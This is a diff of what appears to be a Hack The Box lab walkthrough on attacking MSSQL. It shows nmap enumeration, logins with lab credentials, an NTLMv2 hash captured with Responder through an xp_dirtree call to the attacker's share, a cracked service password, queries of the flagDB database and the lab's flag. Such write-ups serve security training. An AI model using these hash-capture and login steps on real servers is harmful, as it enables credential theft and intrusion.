@@ -13,7 +13,6 @@ nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config
 # Loging into mssql with provided creds
 sqsh -S $ip -U htbdbuser -P "MSSQLAccess01\!" -h
 
-
 # After testing if impersonation was possible and some other attacks, finally what worked was capturing the hash with a smb share.
 
 # Step 1: launch responder on a terminal
@@ -21,6 +20,7 @@ sudo responder -I tun0
 
 # Step 2: trying to connect to the share.
 EXEC master..xp_dirtree '\\$ipfrommykali\share\'
+go
 
 # Step 3: The hash will appear on the responder server
 [SMB] NTLMv2-SSP Client   : 10.129.203.12
@@ -38,3 +38,45 @@ princess1        (mssqlsvc)
 
 
 Enumerate the "flagDB" database and submit a flag as your answer.
+
+```
+# Login in the domain
+sqsh -S $ip -U .\\mssqlsvc -P "princess1" -h
+
+# List databases
+SELECT name FROM master.dbo.sysdatabases
+go
+```
+
+```
+master                                                           
+tempdb                                                           
+model                                                            
+msdb                                                             
+hmaildb                                                          
+flagDB    
+```
+
+```
+# List tables from database
+SELECT table_name FROM flagDB.INFORMATION_SCHEMA.TABLES
+go
+```
+
+
+```
+tb_flag  
+```
+
+```
+# See 
+SELECT * FROM tb_flag
+go
+```
+
+```
+HTB{!_l0v3_#4$#!n9_4nd_r3$p0nd3r}
+```
+
+
+
